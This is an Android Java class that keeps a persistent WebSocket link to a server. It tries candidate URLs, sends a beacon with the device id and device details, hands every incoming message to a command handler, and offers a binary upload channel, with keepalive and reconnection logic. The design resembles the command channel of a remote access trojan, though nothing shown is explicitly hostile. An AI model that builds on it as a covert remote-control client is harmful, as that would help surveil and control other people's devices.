package com.aval.seg;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public final class Net {
    private static volatile WebSocketClient ws;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final AtomicBoolean busy = new AtomicBoolean();
    private static volatile int fails;
    private static volatile long lastRx;
    private static Thread wdt;

    public static void start(final Context c) {
        if (busy.get() || (ws != null && ws.isOpen())) return;
        if (!busy.compareAndSet(false, true)) return;
        new Thread(() -> {
            boolean ok = false;
            try {
                List<String> urls = Util.candidates(c);
                Log.d("aval", "candidatos: " + urls);
                for (String u : urls) if (tryConnect(c, u)) { ok = true; break; }
            } catch (Throwable t) {
                Log.d("aval", "start: " + t);
            }
            busy.set(false);
            if (!ok) H.postDelayed(() -> start(c), backoff());
        }).start();
    }

    private static boolean tryConnect(final Context c, final String url) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicBoolean up = new AtomicBoolean();
        try {
            WebSocketClient w = new WebSocketClient(URI.create(url)) {
                @Override public void onOpen(ServerHandshake h) {
                    up.set(true);
                    fails = 0;
                    lastRx = System.currentTimeMillis();
                    Util.remember(c, url);
                    Log.d("aval", "aberto em " + url);
                    send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
                    keepalive(c);
                    latch.countDown();
                }
                @Override public void onMessage(String m) {
                    lastRx = System.currentTimeMillis();
                    Cmd.handle(c, m);
                }
                @Override public void onClose(int code, String r, boolean remote) {
                    Log.d("aval", "close " + code + " " + r + " " + url);
                    if (ws != this) return;
                    H.postDelayed(() -> start(c), backoff());
                }
                @Override public void onError(Exception e) {
                    Log.d("aval", "err " + e + " " + url);
                    latch.countDown();
                }
            };
            w.setConnectionLostTimeout(25);
            w.connect();
            if (!latch.await(6, TimeUnit.SECONDS) || !up.get()) {
                try { w.close(); } catch (Throwable ignored) {}
                return false;
            }
            ws = w;
            return true;
        } catch (Throwable t) {
            Log.d("aval", "falhou " + url + ": " + t);
            return false;
        }
    }

    private static void keepalive(final Context c) {
        if (wdt != null) return;
        wdt = new Thread(() -> {
            while (true) {
                try { Thread.sleep(10000); } catch (InterruptedException e) { return; }
                WebSocketClient w = ws;
                if (w == null || !w.isOpen()) continue;
                if (System.currentTimeMillis() - lastRx > 35000) {
                    Log.d("aval", "sem resposta, reciclando");
                    try { w.close(); } catch (Throwable ignored) {}
                    continue;
                }
                send("{\"t\":\"ka\"}");
            }
        });
        wdt.setDaemon(true);
        wdt.start();
    }

    private static long backoff() {
        fails = Math.min(fails + 1, 6);
        return 2500L * fails + (long) (Math.random() * 1200);
    }

    public static void send(String s) {
        try {
            WebSocketClient w = ws;
            if (w != null && w.isOpen()) w.send(s);
        } catch (Throwable ignored) {}
    }

    public static void sendBin(byte[] b) {
        try {
            WebSocketClient w = ws;
            if (w == null || !w.isOpen()) return;
            if (w.hasBufferedData()) return;
            w.send(b);
        } catch (Throwable ignored) {}
    }

    public static boolean online() {
        WebSocketClient w = ws;
        return w != null && w.isOpen();
    }
}